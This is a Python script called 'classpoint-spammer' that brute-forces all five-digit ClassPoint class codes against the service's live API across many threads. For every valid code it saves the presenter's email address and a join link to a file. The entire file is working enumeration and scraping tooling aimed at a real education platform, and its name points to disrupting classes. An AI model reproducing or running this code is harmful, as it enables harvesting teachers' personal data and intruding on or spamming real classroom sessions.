import os
import sys
import time
import requests
import threading

VERSION = "1.1.0"
AMOUNT_THREADS = 32
START_CODE = 10000
END_CODE = 99999

def parse_args(args):
    if args[0] == "-h":
        print("""Usage: python3 main.py [OPTIONS]
    
Options:
    -h, --help\t\tShow this help message and exit
    -o, --output\tOutput file name and exit
    -v, --version\tShow program's version number and exit
    -t, --threads\tSet the amount of threads to use
    [class code]\tCheck if a class code is valid and exit
    
If no options are provided, the program will run with default settings.""")
        sys.exit(0)
    elif args[0] == "-o" or args[0] == "--output":
        print("Output file name: /links/links_{current_datetime}.txt")
        sys.exit(0)
    elif args[0] == "-v" or args[0] == "--version":
        print(f"classpoint-spammer v{VERSION}")
        sys.exit(0)
    elif args[0] == "-t" or args[0] == "--threads":
        if len(args) < 2:
            print("Invalid option. Use -h or --help for help.")
            sys.exit(1)
        elif args[1].isnumeric():
            global AMOUNT_THREADS
            AMOUNT_THREADS = min(int(args[1]), 128)
        else:
            print("Invalid option. Use -h or --help for help.")
            sys.exit(1)
    elif args[0].isnumeric():
        if requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={args[0]}").status_code != 200:
            print(f"Class code {args[0]} is invalid.")
            sys.exit(1)
        else:
            print(f"Class code {args[0]} is valid.")
            sys.exit(0)
    else:
        print("Invalid option. Use -h or --help for help.")
        sys.exit(1)

os.chdir(os.path.dirname(os.path.abspath(__file__)))
starttime = time.strftime("%d-%m-%y_%H:%M:%S")

if not os.path.isdir("links"):
    os.mkdir("links")

if len(sys.argv) > 1:
    parse_args(sys.argv[1:])

print("\033c")
print(f"classpoint-spammer v{VERSION}\nSearching...\n")

# create the file in write mode
with open(f"links/links_{starttime}.txt", "w") as f:
    f.write("")
    
def search_code(c):
    data = requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={c}")
    if data.status_code != 200:
        return

    resData = data.json()

    with open(f"links/links_{starttime}.txt", "a") as f:
        f.write(f"Email: {resData['presenterEmail']}\nhttps://www.classpoint.app/?code={c}\n\n")

    print("Class code found: " + str(c))
    print("Link saved.\n")
    
def search_codes(start, end):
    for code in range(start, end):
        search_code(code)

code = START_CODE
threads = []

thread_increment = (END_CODE - START_CODE) // AMOUNT_THREADS

for i in range(AMOUNT_THREADS):
    threads.append(threading.Thread(target=search_codes, args=(code, code + thread_increment)))
    code += thread_increment
    
for thread in threads:
    thread.start()
    
for thread in threads:
    thread.join()

print("Search completed. Links saved to links/links_" + starttime + ".txt\n")
